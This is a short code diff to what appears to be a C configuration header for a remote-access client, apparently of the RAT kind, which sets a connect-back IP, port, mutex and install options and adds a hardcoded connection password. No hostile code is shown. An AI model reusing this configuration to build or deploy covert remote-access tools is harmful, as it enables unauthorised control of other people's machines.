@@ -2,7 +2,7 @@
 
 #define CONNECTION_IP "127.0.0.1"
 #define CONNECTION_PORT 1234
-#define CONNECTION_PASSWORD
+#define CONNECTION_PASSWORD "Indetectables.NET"
 #define SERVER_MUTEX "{1234-1234}"
 #define SERVER_GROUP "Default"
 #define SERVER_INSTALL
